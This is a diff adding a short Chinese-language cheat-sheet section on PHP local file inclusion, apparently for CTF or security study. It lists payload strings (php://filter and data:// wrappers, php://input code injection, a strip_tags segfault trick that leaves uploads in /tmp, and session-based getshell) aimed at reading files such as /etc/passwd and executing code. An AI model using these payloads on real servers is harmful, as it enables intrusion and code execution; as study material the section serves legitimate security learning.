@@ -219,3 +219,27 @@ ret=reth+"^"+rett
 
 print ret
 ```
+
+## LFI
+
+### Wrapper
+
+```
+php://filter/convert.base64-encode/resource=index.php
+```
+### include
+
+- ``php://input`` + POST报文php代码
+
+- ``data://text/plain,<phpcode>``
+
+- php7 ``php://filter/string.strip_tags=/etc/passwd`` 
+  
+  导致php在执行过程中出现segment fault错误，这样如果再此同时上传文件那么临时文件就会被保存在/tmp目录下，不会被删除。
+  文件名需要爆破``/tmp/phpxxxxx``
+
+- session + lfi getshell
+
+### 参考资料
+
+https://xz.aliyun.com/t/5535#toc-7
